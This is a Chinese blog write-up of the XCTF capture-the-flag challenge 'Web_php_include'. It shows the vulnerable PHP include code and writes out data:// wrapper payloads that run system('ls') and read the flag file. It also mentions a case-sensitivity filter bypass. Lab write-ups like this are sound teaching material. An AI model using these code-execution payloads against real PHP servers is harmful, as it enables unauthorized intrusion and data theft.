---
title: '[攻防世界]Web_php_include'
date: '2021-09-21 23:34:17'
draft: false
categories: ['CTF']
tags: ['CTF', 'Medium', 'PHP', 'Web', 'Writeup', '攻防世界']
---

**题目来源:**
---------

[攻防世界>>答题>>Web>>高手进阶区>>Web\_php\_include](https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=5415&page=1)

**前置知识:**
---------

PHP include()与php伪协议: [PHP伪协议总结 - SegmentFault 思否](https://segmentfault.com/a/1190000018991087)

PHP strstr(): `strstr(string $haystack, [mixed](https://www.php.net/manual/zh/language.types.declarations.php#language.types.declarations.mixed) $needle, bool $before_needle = false)`查找$needle在$haystack中的首次出现,返回值为字符串或0(未查找到结果)。 \[su\_highlight\]注意该函数区分大小写\[/su\_highlight\] 。 [详细文档>>](https://www.php.net/manual/zh/function.strstr.php)

PHP str\_replace(): 字符串替换。[详细文档>>](https://www.php.net/manual/zh/function.str-replace.php)

**WriteUp:**
------------

打开链接访问网页,发现显示以下代码:

``` php
<?php
show_source(__FILE__);
echo $_GET['hello'];
$page=$_GET['page'];
while (strstr($page, "php://")) {
    $page=str_replace("php://", "", $page);
}
include($page);
?>
```

分析代码:

通过GET请求发送`hello`和`page`给服务器,`hello`会被`echo`语句输出出来,`page`会传给`$page`变量,`$page`变量中的`php://` 被过滤掉后传到`include($page);`语句当中。

首先我们先扫描常用的php页面:

![001](https://image.txgde.space/2021/09/image.png)

发现可以访问phpinfo.php,因为可以通过GET请求控制`include($page)`这个语句的执行内容,因此猜想可以通过伪协议来执行php语句,前往phpinfo.php页面查看是否满足条件:

![002](https://image.txgde.space/2021/09/image-1-1024x245.png)

发现`allow_url_fopen`与 `allow_url_ include`的值都为on,满足伪协议的条件。

这里我选择了date://这个伪协议

date://伪协议的用法:

``` plain
data://text/plain,<语句>
data://text/plain,base64,<语句(需base64加密)>

```

构造`?page=data://text/plain,<?php system("ls");?>`的GET请求(注意URL转码)发送:

![003](https://image.txgde.space/2021/09/image-2.png)

发现fl4gisisish3r3.php文件,再次构造`?page=data://text/plain,<?php show_source("fl4gisisish3r3.php")?>`输出该文件的源码

![004](https://image.txgde.space/2021/09/image-3-1024x595.png)

得到flag(注意:若使用cat fl4gisisish3r3.php的方式查看flag需要在网页源代码里才能看到,页面不直接显示)

* * *

做这道题时我还有一些其他思路,比如利用strstr()大小写敏感来防止php://伪协议被过滤。而且我感觉hello这个GET请求应该也可以利用拿到flag,不过目前我对php的了解还不够多,想不到什么办法,不过网上有很多dalao利用了这个hello。这次就先写这一个方法吧,有空研究研究继续写
